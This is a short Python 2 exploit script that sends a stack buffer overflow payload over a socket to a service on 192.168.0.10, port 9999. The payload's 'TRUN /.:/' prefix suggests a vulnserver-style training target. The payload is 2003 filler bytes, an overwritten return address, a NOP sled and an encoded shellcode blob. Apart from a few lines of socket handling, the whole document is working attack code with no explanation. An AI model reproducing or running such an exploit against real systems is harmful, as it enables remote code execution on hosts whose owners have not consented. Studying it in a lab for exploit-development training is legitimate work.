#!/usr/bin/python
import sys
import socket
# Python 2 version of this script

overflow = (
"\xbf\x22\xed\x7d\xab\xdb\xd3\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\xca\x11\x9f\x5e\xf6\x02\xe2"
"\xa1\x06\xd3\x83\x28\xe3\xe2\x83\x4f\x60\x54\x34\x1b\x24\x59"
"\xbf\x49\xdc\xea\xcd\x45\xd3\x5b\x7b\xb0\xda\x5c\xd0\x80\x7d"
"\xdf\x2b\xd5\x5d\xde\xe3\x28\x9c\x27\x19\xc0\xcc\xf0\x55\x77"
"\xe0\x75\x23\x44\x8b\xc6\xa5\xcc\x68\x9e\xc4\xfd\x3f\x94\x9e"
"\xdd\xbe\x79\xab\x57\xd8\x9e\x96\x2e\x53\x54\x6c\xb1\xb5\xa4"
"\x8d\x1e\xf8\x08\x7c\x5e\x3d\xae\x9f\x15\x37\xcc\x22\x2e\x8c"
"\xae\xf8\xbb\x16\x08\x8a\x1c\xf2\xa8\x5f\xfa\x71\xa6\x14\x88"
"\xdd\xab\xab\x5d\x56\xd7\x20\x60\xb8\x51\x72\x47\x1c\x39\x20"
"\xe6\x05\xe7\x87\x17\x55\x48\x77\xb2\x1e\x65\x6c\xcf\x7d\xe2"
"\x41\xe2\x7d\xf2\xcd\x75\x0e\xc0\x52\x2e\x98\x68\x1a\xe8\x5f"
"\x8e\x31\x4c\xcf\x71\xba\xad\xc6\xb5\xee\xfd\x70\x1f\x8f\x95"
"\x80\xa0\x5a\x39\xd0\x0e\x35\xfa\x80\xee\xe5\x92\xca\xe0\xda"
"\x83\xf5\x2a\x73\x29\x0c\xbd\xd0\xbf\x63\x01\x41\xc2\x7b\x68"
"\xcd\x4b\x9d\xe0\xfd\x1d\x36\x9d\x64\x04\xcc\x3c\x68\x92\xa9"
"\x7f\xe2\x11\x4e\x31\x03\x5f\x5c\xa6\xe3\x2a\x3e\x61\xfb\x80"
"\x56\xed\x6e\x4f\xa6\x78\x93\xd8\xf1\x2d\x65\x11\x97\xc3\xdc"
"\x8b\x85\x19\xb8\xf4\x0d\xc6\x79\xfa\x8c\x8b\xc6\xd8\x9e\x55"
"\xc6\x64\xca\x09\x91\x32\xa4\xef\x4b\xf5\x1e\xa6\x20\x5f\xf6"
"\x3f\x0b\x60\x80\x3f\x46\x16\x6c\xf1\x3f\x6f\x93\x3e\xa8\x67"
"\xec\x22\x48\x87\x27\xe7\x68\x6a\xed\x12\x01\x33\x64\x9f\x4c"
"\xc4\x53\xdc\x68\x47\x51\x9d\x8e\x57\x10\x98\xcb\xdf\xc9\xd0"
"\x44\x8a\xed\x47\x64\x9f")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print("Error while connecting to server")
    sys.exit()